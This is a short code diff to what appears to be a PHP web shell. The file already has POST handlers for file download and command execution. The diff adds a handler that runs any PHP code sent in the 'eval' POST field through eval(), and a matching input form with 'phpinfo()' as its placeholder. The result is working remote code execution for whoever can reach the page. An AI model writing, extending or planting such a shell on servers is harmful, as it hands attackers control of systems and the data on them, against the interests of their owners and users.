@@ -148,6 +148,11 @@ if (isset($_POST["download"]))
 	}
 }
 
+if (isset($_POST["eval"]))
+{
+	eval($_POST["eval"]);
+}
+
 if (isset($_POST["exec"]))
 {
 	$command = $_POST["exec"];
@@ -302,6 +307,12 @@ echo( sprintf("
 	)
 );
 ?>
+
+<form action="<? echo($shell); ?>" method="POST">
+	<label for="eval">Code:</label>
+	<input type="text" id="eval" name="eval" placeholder="phpinfo()">
+	<input type="submit" value="eval">
+</form>
 
 <form action="<? echo($shell); ?>" method="POST">
 	<label for="exec">Command:</label>
